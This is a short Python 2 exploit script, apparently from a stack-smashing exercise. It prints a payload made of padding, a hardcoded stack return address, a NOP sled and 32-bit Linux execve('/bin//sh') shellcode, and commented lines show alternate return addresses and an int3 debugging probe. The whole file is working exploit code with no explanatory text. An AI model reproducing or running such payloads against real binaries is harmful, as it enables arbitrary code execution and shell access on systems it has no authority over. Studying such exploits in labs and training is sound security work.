#!/usr/bin/env python
import struct

padding = (0x54-0x41)*"AAAA"
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

# stack eip
#eip = struct.pack("<I", 0xbffff760)

nopslides = "\x90\x90\x90\x90"*100
eip = struct.pack("<I", 0xbffff7c0+32)

# try in /tmp and use stack esp
#eip = struct.pack("<I", 0xbffff7c0)

# use "\xCC" to check shellcode and nop
#print padding + eip + "\xCC"*4

print padding + eip + nopslides + shellcode